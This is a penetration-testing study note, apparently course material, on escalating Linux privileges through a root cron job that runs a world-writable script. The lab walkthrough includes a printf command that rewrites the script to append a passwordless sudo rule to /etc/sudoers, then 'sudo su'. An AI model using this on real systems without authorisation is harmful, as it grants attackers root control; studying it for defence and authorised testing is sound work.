# B - Exploiting Misconfigured Cron Jobs

## **Cron Jobs**

* Linux implements task scheduling through a utility called Cron.
* Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specific schedule.
* An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
* The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.

## **Exploiting Misconfigured Cron Jobs**

* Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user.
* This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
* In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

## **Practical Demonstration**

After gaining initial foothold on the target system, with an unpriliveged account (whoami -> student).

{% code overflow="wrap" lineNumbers="true" %}
```bash
#
crontab -l # Returns list of cronjobs scheduled by current user

# we saw a file [message] owned by root, so why is this file here? 

# we use the grep utility to search all occurences of the file [message]
grep -rnw /usr -e "/home/student/message" # Use grep to search for occurencies of the path in any script/file/directory in /usr.
# or
grep -r / -e "/home/student/message" 2>/dev/null # -r is recursively, -e is match exact string.

# we get a result: "/usr/local/share/copy.sh"
# when we check the permissions for the "copy.sh" script, we see that the file is owned by root, but other users has rwx permissions.
# you can cat the content of the script.

# we can modify the content of the script to add us to sudo group everytime it runs.
# since there is no text editor in the lab, we use the "printf" cmd to write.
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
# It allows non-elevated "student" user to do everything, and redirect the command to the cronjob associated to the file found earlier.
sudo -l # outputs list of root cmds the user can do without password.
sudo su # now we are root.




# RECAP
# 1- Identify files or scripts used by Cronjob and created by a privileged user
# 2- Check if this file/script can be modified by an unprivileged user
# 3- If it is, add a command to the file/script that add the unprivileged user to the sudoers file
# 4- The next time the Cronjob will be executed, the unprivliged user will be part of the sudoers!

```
{% endcode %}



